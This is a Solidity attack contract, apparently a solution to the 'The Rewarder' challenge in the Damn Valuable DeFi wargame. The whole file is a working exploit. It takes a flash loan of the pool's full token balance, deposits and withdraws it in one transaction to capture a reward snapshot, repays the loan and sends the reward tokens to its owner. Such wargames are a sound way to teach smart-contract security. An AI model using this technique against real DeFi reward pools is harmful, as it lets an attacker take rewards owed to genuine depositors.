// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

contract AttackRewardPool {
    FlashLoanerPool private loanPool;
    TheRewarderPool private rewardPool;
    DamnValuableToken private liquidityToken;
    RewardToken private rewardToken;

    address private owner;

    constructor(
        address _loanPool,
        address _rewardPool,
        address _liquidityToken,
        address _rewardToken
    ) {
        loanPool = FlashLoanerPool(_loanPool);
        rewardPool = TheRewarderPool(_rewardPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    function attack() public {
        uint256 loanAmount = liquidityToken.balanceOf(address(loanPool));
        liquidityToken.approve(address(rewardPool), loanAmount);

        loanPool.flashLoan(loanAmount);

        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);
        liquidityToken.transfer(address(loanPool), _amount);
    }
}
